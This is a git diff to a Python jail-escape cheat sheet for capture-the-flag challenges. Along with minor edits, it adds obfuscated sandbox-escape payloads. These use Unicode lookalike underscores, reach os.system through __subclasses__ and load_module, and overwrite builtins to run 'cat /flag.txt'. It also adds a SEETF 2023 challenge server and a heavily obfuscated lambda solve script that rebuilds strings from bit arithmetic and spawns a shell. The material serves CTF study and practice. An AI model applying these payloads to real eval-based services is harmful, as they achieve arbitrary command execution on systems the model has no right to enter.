@@ -1,6 +1,6 @@
 ---
 title: 'Pyjail Cheat Sheet'
-date: '2024-06-16'
+date: '2024-06-26'
 category: 'cheatsheet'
 description: ""
 tags:
@@ -144,10 +144,11 @@ _＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶
 # no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)
 (𝘥:=()._＿𝘥𝘰𝘤＿_,d:=()._＿dir＿_().__class__(d),𝘴:=𝘥.𝘱𝘰𝘱(19),𝘥._＿𝘤𝘭𝘢𝘴𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_).𝘱𝘰𝘱(1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().𝘱𝘰𝘱(104).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.𝘱𝘰𝘱(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.𝘱𝘰𝘱(54)))
 
-# no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval (>= python3.8)
+# no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval, has existing object (>= python3.8)
 class cobj:...
 obj = cobj()
-[d:=[].__doc__,o:=d[32],s:=d[17],h:=d[54],[obj[s+h] for obj.__class__.__getitem__ in [[obj[o+s] for obj.__class__.__getitem__ in [[+obj for obj.__class__.__pos__ in [[].__class__.__mro__[1].__subclasses__]][0][104].load_module]][0].system]]]
+
+[d:=[]._＿doc＿_,o:=d[32],s:=d[17],h:=d[54],[obj[s+h] for obj._＿class＿_._＿getitem＿_ in [[obj[o+s] for obj._＿class＿_._＿getitem＿_ in [[+obj for obj._＿class＿_._＿pos＿_ in [[]._＿class＿_._＿mro＿_[1]._＿subclasses＿_]][0][104].load_module]][0].system]]]
 ```
 
 ### assigning attributes and variables
@@ -166,7 +167,7 @@ cobj.__setattr__("field", "value"), print(cobj.field)
 [cobj for cobj.field in ["value"]], print(cobj.field)
 ```
 
-### getting attributes without dot
+### getting attributes
 ```py
 class cobj:...
 obj = cobj()
@@ -197,22 +198,18 @@ match ():
       pass
 print(a) # ().__doc__
 
-# overwrite builtins
-__builtins__ = sys
-__builtins__ = modules
-__builtins__ = os
-system("cat /flag.txt")
-```
-
-### getting attributes without underscore
-```py
-# exec
 # try...except
 try:
   "{0.__doc__.lol}".format(()) # format string by itself can also be used to leak values
 except Exception as e:
   a = e.obj
   print(a) # ().__doc__
+
+# overwrite builtins
+__builtins__ = sys
+__builtins__ = modules
+__builtins__ = os
+system("cat /flag.txt")
 ```
 
 ### running functions and methods without parenthesis
@@ -222,7 +219,7 @@ obj = cobj()
 ```
 ```py
 # list comprehension
-[+obj for obj.__class__.__pos__ in [().__class__.__subclasses__]][0]
+[+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]][0]
 [obj["print(123)"] for obj.__class__.__getitem__ in [eval]][0]
 ```
 
@@ -262,8 +259,8 @@ print(delete_me) # error
 - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code
 
 ### bullet points
-- `f"{65:c}"` can format an int to char (equalivant to `"%c" % 65  == chr(65) == "A"`)
-- `"".encode().fromhex("41").decode()` parses hex into string
+- `f"{65:c}"` can format an int to char (equivalent to `"%c" % 65  == chr(65) == "A"`)
+    - `"".encode().fromhex("41").decode()` parses hex into string
 - `type`
     - `[].__class__.__class__`
     - `"".__class__.__class__`
@@ -280,10 +277,12 @@ print(delete_me) # error
 - `dict`
     - `{}.__class__`
     - `obj.__dict__.__class__`
+    - `"".__class__.__dict__.copy().__class__`
 - `class instances`:
     - `class cobj:...`
         - `obj = cobj()`
     - `type("cobj", (object,), {})()`
+        - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), "".__class__.__dict__.copy().__class__())()`
 
 ## CTF
 
@@ -1034,6 +1033,79 @@ path: .__builtins__["help"].__repr__.__globals__["sys"].modules["__main__"].DISA
 value: []
 path: .__builtins__["help"].__repr__.__globals__["sys"].modules["os"].environ["PYTHONINSPECT"]
 value: "1"
+```
+
+### SEETF 2023: Another PyJail
+- `server.py`
+```py
+from types import CodeType
+
+def clear(code):
+    return CodeType(
+        code.co_argcount, code.co_kwonlyargcount, code.co_nlocals,
+        code.co_stacksize, code.co_flags, code.co_code,
+        # No consts for youuu
+        tuple(clear(c) if isinstance(c, CodeType) else None for c in code.co_consts),
+        # No names for youuuu
+        (),
+        code.co_varnames, code.co_filename, code.co_name,
+        code.co_firstlineno, code.co_lnotab, code.co_freevars,
+        code.co_cellvars
+    )
+
+print(eval(clear(compile(input("> "), __name__, "eval")), {'__builtins__': {}}, {})(getattr))
+```
+- `solve.py`
+```py
+@ juliapoo
+lambda g: (
+    (lambda _0, _1:
+        (lambda _2, _4, _8, _16, _32, _64, _128:
+        (lambda _1234567890:
+            (lambda
+                s_n,s_r,s_a,s_o,s_t,s_c,s_l,s_larr,s_i,s_g,s_e,s_b,s_dash,s_f,s_ ,s_rarr,s_u,
+                s_T,
+                s_F,s_s,
+                s_lbrack,s_rbrack,
+                s_4,s_5,s_9,s_6,s_3,s_8,s_2,s_7,s_0,s_1,
+                s_x,s_j,s_N:
+                (lambda morestr:
+                    (lambda s_d,s_m,s_h:
+                        (lambda fromhex, decodestr:
+                            (lambda
+                                s__class__,
+                                s__bases__,
+                                s__subclasses__,
+                                s_load_module,
+                                s_system:
+                                (lambda load_module:
+                                    (lambda os:
+                                        (lambda system: system(s_s + s_h))
+                                        (g(os, s_system))
+                                    )(load_module(s_o + s_s))
+                                )(g(g(g(g(g, s__class__), s__bases__)[_0], s__subclasses__)()[_16+_64], s_load_module))
+                            )(
+                                g(fromhex(s_5+s_f+s_5+s_f+s_6+s_3+s_6+s_c+s_6+s_1+s_7+s_3+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
+                                g(fromhex(s_5+s_f+s_5+s_f+s_6+s_2+s_6+s_1+s_7+s_3+s_6+s_5+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
+                                g(fromhex(s_5+s_f+s_5+s_f+s_7+s_3+s_7+s_5+s_6+s_2+s_6+s_3+s_6+s_c+s_6+s_1+s_7+s_3+s_7+s_3+s_6+s_5+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
+                                g(fromhex(s_6+s_c+s_6+s_f+s_6+s_1+s_6+s_4+s_5+s_f+s_6+s_d+s_6+s_f+s_6+s_4+s_7+s_5+s_6+s_c+s_6+s_5), decodestr)(),
+                                g(fromhex(s_7+s_3+s_7+s_9+s_7+s_3+s_7+s_4+s_6+s_5+s_6+s_d), decodestr)()
+                            )
+                        )(g(g(s_5+s_f, s_e+s_n+s_c+s_o+s_d+s_e)(), s_f+s_r+s_o+s_m+s_h+s_e+s_x), s_d+s_e+s_c+s_o+s_d+s_e)
+                    )(morestr[_1+_2+_4+_8],morestr[_2+_8],morestr[_1+_4+_8])
+                )(f"{g({}, s_g+s_e+s_t)}")
+            )(
+                f'{g}'[_8],f'{g}'[_1+_8+_16],f'{g}'[_2+_4+_16],f'{g}'[_16],f'{g}'[_1+_4],f'{g}'[_1+_4+_8],f'{g}'[_4],f'{g}'[_0],f'{g}'[_1+_2],f'{g}'[_1+_2+_16],f'{g}'[_4+_16],f'{g}'[_1],f'{g}'[_2+_4],f'{g}'[_2+_8],f'{g}'[_1+_8],f'{g}'[_2+_8+_16],f'{g}'[_2],
+                f'{g==g}'[_0],
+                f'{g!=g}'[_0],f'{g!=g}'[_1+_2],
+                f"{({*f'{g}'[_0:_0]})}"[_1+_2],f"{({*f'{g}'[_0:_0]})}"[_4],
+                f"{_1234567890}"[_1+_2],f"{_1234567890}"[_4],f"{_1234567890}"[_8],f"{_1234567890}"[_1+_4],f"{_1234567890}"[_2],f"{_1234567890}"[_1+_2+_4],f"{_1234567890}"[_1],f"{_1234567890}"[_2+_4],f"{_1234567890}"[_1+_8],f"{_1234567890}"[_0],
+                f"{(lambda:(yield))()}"[_1+_2+_8+_16],f"{(lambda:(yield))()}"[_1+_4+_8],f"{(lambda:(yield))()}"[_2+_16]
+            )
+        )(_2+_16+_64+_128+(_1<<(_1+_8))+(_1<<(_1+_16))+(_1<<(_2+_16))+(_1<<(_4+_16))+(_1<<(_1+_2+_4+_16))+(_1<<(_8+_16))+(_1<<(_1+_2+_8+_16))+(_1<<(_2+_4+_8+_16)))
+        )(_1+_1, _1<<(_1+_1), _1<<(_1+_1+_1), _1<<(_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1+_1+_1))
+    )(g!=g, g==g)
+)
 ```
 
 ### BYUCTF 2023: Builtins 1
